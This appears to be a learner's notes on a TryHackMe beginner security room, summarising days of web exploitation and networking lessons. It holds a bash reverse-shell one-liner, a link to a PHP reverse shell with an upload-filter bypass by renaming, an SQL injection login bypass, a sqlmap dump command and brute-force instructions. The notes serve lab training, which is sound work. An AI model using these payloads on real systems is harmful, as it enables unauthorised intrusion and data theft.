# Room
https://tryhackme.com/room/learncyberin25days

# Task 1 - Intro
Intro

# Task 2 - Get Connected
Get Connected

# Task 3 - Day 1 - Web Exploitation
* DNS
* IP
* HTTP/S
  * HTTP is an inherently stateless protocol, data does not persist
* Cookies
  * a constrcut that supports user state

Complete questions, CyberChef is your friend:
* https://gchq.github.io/CyberChef/

# Task 4 - Day 2 - Web Exploitation
* GET parameters
  * ?test=value
    * ? specifies the parameter name is coming next
    * test is the parameter name
    * = specifies the parameter value is coming next
    * value is the parameter value
  * ?test=value&test2=value2
    * ? specifies the parameter name is coming next
    * test is the parameter name
    * = specifies the parameter value is coming next
    * value is the parameter value
    * & specifies another parameter name is coming next
    * test2 is the next parameter name
    * = specifies the parameter value is coming next
    * value2 is the paramemter value
* File Uploads
  * file extension filtering is important
* Reverse Shells
* Reverse Shell Listeners

The questions are completed by using the information on the displayed web page.  You will also use file extension bypassing by changing the name of this reverseshell to .jpg.php

https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

After the file is uploaded you can start your listener with nc -nvlp and then execute the reverse shell and grab the flag

# Task 5 - Day 3 - Web Exploitation
* Authentication
* Default Credentials
* Dictionary Attacks with Burp Suite

Using Burp Suite intruder with the cluster bomb setting, brute force your way into the web application login system using the provided short list of possible credentials while observing the differences in response output

# Task 6 - Day 4 - Web Exploitation
* Fuzzing
* gobuster
* wfuzz

Wordlists
* https://github.com/danielmiessler/SecLists

# Task 7 - Day 5 - Web Exploitation
* SQL Injection
  * Login Bypass
  * Blind SQL Injection
  * Union SQL Injection
* SQLMap
  * SQLMap and Burp Suite

* Resources
  * https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
  * https://github.com/payloadbox/sql-injection-payload-list
  * https://www.codecademy.com/articles/sql-commands

```
' or true --

sqlmap -r r.request --dump-all --dbms sqlite --tamper=space2comment
```

# Task 8 - Day 6 - Web Exploitation
* XSS
  * Stored XSS
  * Reflected XSS
* Detection
  * OWASP ZAP
* Resources
  * https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Input_Validation_Cheat_Sheet.md
  * https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
  * https://github.com/payloadbox/xss-payload-list

# Task 9 - Day 7 - Networking
* IP Address
  * Public
  * Private
  * NAT
* Protocols
  * TCP
    * Three-Way Handshake
    * ISN
    * Reassembly
  * IP
* Wireshark
  * Filters

```
icmp
http.request.method eq get
http.request.method == "GET"
ftp
ftp.request.command == "PASS"
File > Export Objects > HTTP
```

# Task 10 - Day 8 - Networking
* nmap
* scanning
  * three-way handshake
  * connect scan : -sT
  * SYN scan : -sS
  * results
    * SYN/ACK = open
    * RST = closed
    * Multiple attempts = filtered
  * additional types
    * -A - identify services
    * -O - OS detection
    * -p - scan specific port
    * -p- - scan all ports
    * -sV - version and fingerprint
* timing
  * -T0 - stealthiest
  * -T5 - most aggressive
* scripting engine
  * --script

* scanning defense
  * snort
  * suricata

```
map -A -T4 10.10.33.224 | tee nmap.txt
```

# Task 11 - Day 9 - Networking
* FTP
  * TCP 20 - data
  * TCP 21 - commands
* Anonymous login
* ftp 1.2.3.4
* commands
  * ls
  * cd
  * get
  * put

```
bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
```

# Task 12 - Day 10 - Networking
* Samba
* SMB - Windows and Linux support
  * request/response
  * share
  * enumeration
    * enum4linux
  * access
    * smbclient
* NFS - Linux support

```
enum4linux 10.10.178.30 | tee e4l.txt
smbclient //10.10.178.30/tbfc-hr
```